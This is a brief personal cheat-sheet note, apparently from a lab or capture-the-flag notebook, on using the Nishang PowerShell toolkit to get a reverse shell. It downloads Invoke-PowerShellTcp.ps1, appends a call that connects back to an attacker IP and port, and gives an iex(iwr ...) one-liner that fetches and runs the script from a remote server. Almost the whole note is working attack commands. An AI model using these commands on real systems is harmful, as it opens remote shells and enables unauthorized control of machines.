---
title: "nishang"
tags:
  - fetus
---
- repo link: https://github.com/samratashok/nishang/tree/master 
- shell: 
```sh
curl https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 -o rev.ps1
```
- add this at the end:
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.200.180.200 -Port 1337
```

```powershell
iex(iwr http://10.200.81.200:16001/rev.ps1 -UseBasicParsing)
```
